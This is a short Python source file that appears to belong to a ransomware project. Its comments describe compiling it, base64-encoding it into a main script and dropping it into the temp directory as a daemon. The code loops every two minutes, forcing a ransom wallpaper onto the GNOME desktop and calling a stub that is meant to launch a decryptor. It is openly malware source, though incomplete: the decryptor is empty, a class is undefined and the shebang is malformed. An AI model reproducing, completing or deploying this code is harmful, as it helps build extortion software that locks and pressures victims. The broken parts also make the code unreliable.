#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import subprocess
import tempfile
import threading
import time

# this file is going to be compiled then turned into base64 encoded writen in the main.py file, then saved in the TEMPDIR to act as a daemon/
# it should have -> change wallpaper / run decryptor.elf

TEMPDIR = tempfile.gettempdir()

def run_decryptor():
    pass

def change_wallpaper():
    wall = Wallpaper()
    paper = wall.wall
    wallpaper = 'gcwallpaper.jpg'
    print (os.path.join(TEMPDIR, wallpaper))
    if (not os.path.isfile(os.path.join(TEMPDIR, wallpaper))):
        with open(os.path.join(TEMPDIR, wallpaper), 'wb') as f:
            f.write(paper)
        # generate wallpaper

    os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.path.join(TEMPDIR, wallpaper))


def menu():
    while True:
        change_wallpaper()
        run_decryptor()
        time.sleep(120) # sleep for 2 minutes


if __name__ == '__main__':
    try:
        menu()
    except:
        menu()
    pass
